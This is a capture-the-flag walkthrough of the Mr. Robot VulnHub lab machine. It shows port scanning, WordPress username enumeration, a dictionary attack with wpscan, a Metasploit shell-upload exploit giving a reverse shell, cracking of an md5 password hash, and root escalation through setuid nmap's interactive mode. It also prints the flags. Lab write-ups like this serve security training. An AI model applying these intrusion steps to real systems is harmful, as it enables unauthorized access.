# Mr. Robot Vulnhub Writeup

[Vulnhub Link](https://www.vulnhub.com/entry/mr-robot-1,151/)

### Key 1

---

First we nmap scan the box for any open ports and services

`nmap -sC -sV -oA nmap_scans/init_scan 10.0.0.63` and we get the following

```bash
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

pretty standard stuff, so we check out the web page and there's some Mr. Robot related hacker text and a prompt with nothing in particular. Some classic enumeration techniques and we run a directory scan with ffuf (separate results file)

`ffuf -c -u "https://10.0.0.63/FUZZ" -w common.txt`

The three things we did find that are useful are robots.txt, phpmyadmin, and wp-admin, letting us know that wordpress is the back end CMS.

If we check the robots.txt page we are prompted with 2 files - `key-1-of-3.txt` txt (flag) and `fsocity.dic` (a dictionary file)
flag 1 - `073403c8a58a1f80d943455fb30724b9`

### Key 2

---

Directory scan shows a wordpress back end

Go to `/wp-admin` and put in the normal checks (root, admin, etc) and we all get the message `ERROR: Invalid username. Lost your password?`

Because the name of the box is Mr. Robot I tried the username `elliot` (the main character from the show). I would later find out that there's a page elsewhere on the website that holds the username encoded in base-64, but for this sake we can just call this an OSINT challenge

enter a random password and you would be shown a diff. message `ERROR: The password you entered for the username elliot is incorrect`

So now we know the user is `elliot`, and we have a dictionary we can use to find out the password. so let's use hydra to attack it

use wpscan to get password
`wpscan --url http://10.0.0.63 --enumerate p --enumerate t --enumerate u -P newpasslist.txt -U elliot`

returns - `[80][http-post-form] host: 10.0.0.63   login: elliot   password: ER28-0652`

There's a metasploit module for use to use - `exploit/unix/webapp/wp_admin_shell_upload`

set the options and run it to get a reverse shell

It's a basic tcp shell so let's use the python one-liner for a better experience

`python -c "import pty;pty.spawn('/bin/bash')"`

Now with a full bash shell go to `/home` and there's user  `robot` with file `key-2-of-3.txt` but we can't read it

There's a `password.raw-md5` in the same directory with the contents
`robot:c3fcd3d76192e4007dfb496cca67e13b` - md5 decodes to `abcdefghijklmnopqrstuvwxyz` using an online cracker
and we can login as user robot and get the second flag `su robot`
flag 2 - `822c73956184f694993bede3eb39f959`

### Key 3

---

download and run [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) from github - we can see that there's a program with a setuid bit and runs as root - `nmap`

go to [gtfobins.github.io](https://gtfobins.github.io/) and look and we can privesc easy with `nmap`

`nmap --interactive` and then `!sh` and we have spawned a root shell from nmap interactive terminal

`cd /root && cat key-3-of-3.txt` - `04787ddef27c3dee1ee161b21670b4e4`